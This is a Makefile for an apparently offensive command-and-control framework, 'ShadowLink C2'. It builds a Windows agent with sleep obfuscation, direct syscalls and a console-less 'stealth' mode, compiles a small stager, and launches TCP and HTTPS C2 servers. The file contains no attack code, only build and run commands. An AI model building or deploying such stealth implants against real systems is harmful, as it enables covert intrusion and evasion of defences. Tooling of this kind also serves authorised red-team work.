# ShadowLink C2 Framework - Makefile
# Phase 11: Advanced Stealth - HTTPS, Sleep Obfuscation, Direct Syscalls
# Pour compiler l'agent Windows et gérer le serveur Python

.PHONY: all server server-https agent agent-stealth stager clean help test certs

# Variables
CC = x86_64-w64-mingw32-gcc
CFLAGS = -Wall -O2 -DAES256=1
LDFLAGS = -lws2_32 -ladvapi32 -lwinhttp -lpsapi

# Source files
AGENT_SRC = agent/agent.c agent/aes.c agent/https_transport.c agent/sleep_obfuscation.c agent/syscalls.c
AGENT_OUT = agent/agent.exe
STAGER_SRC = stager/stager.c
STAGER_OUT = stager/stager.exe
SERVER_SRC = server/server.py
SERVER_HTTPS_SRC = server/server_https.py
PYTHON = python3

all: help

help:
	@echo "=== ShadowLink C2 Framework - Phase 11 ==="
	@echo ""
	@echo "Agent Commands:"
	@echo "  make agent          - Compile agent (debug mode, with console)"
	@echo "  make agent-stealth  - Compile agent (stealth, no console)"
	@echo "  make stager         - Compile minimal stager (~10KB)"
	@echo ""
	@echo "Server Commands:"
	@echo "  make server         - Start legacy TCP server (port 4444)"
	@echo "  make server-https   - Start HTTPS server (port 443)"
	@echo "  make certs          - Generate SSL certificates for HTTPS"
	@echo ""
	@echo "Other Commands:"
	@echo "  make install-deps   - Install Python dependencies"
	@echo "  make clean          - Clean compiled files"
	@echo "  make test           - Run tests"
	@echo ""

# Compilation de l'agent Windows (debug - avec console)
agent:
	@echo "[*] Compiling Windows agent (debug mode)..."
	$(CC) $(CFLAGS) $(AGENT_SRC) -o $(AGENT_OUT) $(LDFLAGS)
	@echo "[+] Agent compiled: $(AGENT_OUT)"

# Compilation de l'agent Windows (stealth - sans console)
agent-stealth:
	@echo "[*] Compiling Windows agent (stealth mode)..."
	$(CC) $(CFLAGS) -mwindows $(AGENT_SRC) -o $(AGENT_OUT) $(LDFLAGS)
	@echo "[+] Stealth agent compiled: $(AGENT_OUT)"

# Compilation du stager minimal
stager:
	@echo "[*] Compiling minimal stager..."
	$(CC) -Os -s -DBUILD_STAGER_EXE -mwindows $(STAGER_SRC) -o $(STAGER_OUT) -lwinhttp
	@echo "[+] Stager compiled: $(STAGER_OUT)"
	@ls -la $(STAGER_OUT) 2>/dev/null || dir $(STAGER_OUT)

# Generate SSL certificates
certs:
	@echo "[*] Generating SSL certificates..."
	openssl req -x509 -newkey rsa:4096 -keyout server/server.key -out server/server.crt -days 365 -nodes -subj "/CN=localhost"
	@echo "[+] Certificates generated: server/server.crt, server/server.key"

# Lancement du serveur Python TCP (legacy)
server:
	@echo "[*] Starting legacy TCP C2 server..."
	$(PYTHON) $(SERVER_SRC)

# Lancement du serveur HTTPS (Phase 11)
server-https:
	@echo "[*] Starting HTTPS C2 server (Phase 11)..."
	$(PYTHON) $(SERVER_HTTPS_SRC)

# Installation des dépendances Python
install-deps:
	@echo "[*] Installing Python dependencies..."
	$(PYTHON) -m pip install -r server/requirements.txt
	$(PYTHON) -m pip install flask  # For HTTPS server

# Nettoyage
clean:
	@echo "[*] Cleaning..."
	rm -f $(AGENT_OUT) $(STAGER_OUT)
	rm -f agent/*.o stager/*.o
	find . -type d -name "__pycache__" -exec rm -rf {} + 2>/dev/null || true
	find . -type f -name "*.pyc" -delete
	@echo "[+] Clean complete"

# Tests
test:
	@echo "[*] Running tests..."
	$(PYTHON) -m pytest tests/ -v
